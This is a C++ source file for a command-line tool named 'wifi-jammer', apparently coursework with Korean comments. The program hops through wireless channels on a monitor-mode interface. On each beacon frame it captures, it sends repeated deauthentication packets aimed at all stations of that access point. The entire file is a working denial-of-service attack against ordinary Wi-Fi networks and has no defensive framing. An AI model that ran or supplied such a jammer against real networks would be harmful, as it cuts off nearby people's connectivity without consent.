#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <libnet.h>
#include "deauth.h"
#include "beacon.h"
#include "iwlib.h"
#include <thread>
#include <list>
#include <signal.h>
#include <chrono>

void usage() {
    printf("syntax : dwifi-jammer <interface>\n");
    printf("sample : wifi-jammer mon0\n");
}

typedef struct {
    char* dev_;
} Param;

Param param  = {
    .dev_ = NULL,
};

std::list<int> channelList;
bool stop = false;
double curChannel;

bool parse(Param* param, int argc, char* argv[]) {
    if (argc != 2) {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}
// Get Channel List
bool getChannelList(char* ifname){      // ifname == dev
    /* Create a channel to the NET kernel. */
    int skfd;
    if((skfd = iw_sockets_open()) < 0){
        perror("socket");
        return false;
    }

    /* do the actual work */
    struct iw_range	range;
    double freq;
    int	k;
    char buffer[128];	/* Temporary buffer */
    /* Get list of channels */
    if(iw_get_range_info(skfd, ifname, &range) < 0)
        return false;
    else{
        if(range.num_frequency > 0) {
            for(k = 0; k < range.num_frequency; k++) {
              freq = iw_freq2float(&(range.freq[k]));
              iw_print_freq_value(buffer, sizeof(buffer), freq);
              channelList.push_back(range.freq[k].i);       //range.freq[k].i가 channel 번호
            }
        }
        else
            return false;
    }

    /* Close the socket. */
    iw_sockets_close(skfd);
    return true;
}
// 일정한 주기로 channel hopping
bool channelHopping(char* ifname){      // ifname == dev
    /* Create a channel to the NET kernel. */
    int skfd;
    if((skfd = iw_sockets_open()) <0){
        perror("socket");
        return false;
    }

    /* do the actual work */
    std::list<int>::iterator iter = channelList.begin();
    while(!stop){
        // channelList 인덱스 +5 간격으로 돌면서 channel 변경
        curChannel = *iter;
        struct iwreq wrq;
        double freq;
        freq = curChannel;
        // convert freq&channel
        iw_float2freq(freq, &(wrq.u.freq));
        wrq.u.freq.flags = IW_FREQ_FIXED;
        // set channel
        if(iw_set_ext(skfd, ifname, SIOCSIWFREQ, &wrq) < 0)
            return false;
        printf("current channel : %d\n", (int)curChannel);
        // ((iter(index) +5) mod(channelList.size()))
        for(int i=0;i<5;i++){
            iter++;
            if(iter == channelList.end())
                iter = channelList.begin();
        }
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }

    /* Close the socket. */
    iw_sockets_close(skfd);
//    printf("finish hopping\n");
    return true;
}
// 콘솔 ctrl+c 입력시 인터럽트 발생 => 작업 중지 리스너
void setStop(int sig){
    signal(sig, SIG_IGN);
//    printf("stop!!\n");
    stop = true;
}

int main(int argc, char* argv[]) {
    if (!parse(&param, argc, argv))
        return -1;

    // Get Channel List
    if(!getChannelList(param.dev_))
        return -1;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }

    signal(SIGINT, setStop);   // ctrl+c 인터럽트 시그널 콜백 설정
    std::thread t1(channelHopping, param.dev_);       // channel hopping

    while(!stop){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        struct BeaconHdr* beaconHdr = (struct BeaconHdr*) packet;
        beaconHdr->setDot11Hdr();
        if(beaconHdr->dot11Hdr.type == 0x0 && beaconHdr->dot11Hdr.subtype == 0x8){  // beacon frame이 들어온 순간
            Mac ap = Mac(beaconHdr->getBSSID().getMAC());
            Mac station = Mac("00:00:00:00:00:00");
            while(beaconHdr->tagParm->tag != 0x03) {  // DS Parmater set
                beaconHdr->tagParm = beaconHdr->tagParm->next();
            }
            char* tmp =(char*)beaconHdr->tagParm->value();
            int pktChannel = (int)*tmp;

            // DeauthPacket 생성
            DeauthPacket deauthpkt = DeauthPacket(ap, station);
            // Deauth packet 전송
            for(int i=0;i<10 && !stop && pktChannel == (int)curChannel;i++){
//                printf("send deauth packet\n");
                int send_res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauthpkt), sizeof(DeauthPacket));
                if (send_res != 0)
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", send_res, pcap_geterr(pcap));
                sleep(1);
            }
        }
    }
//    printf("finish main\n");
    t1.join();

    pcap_close(pcap);
    return 0;
}
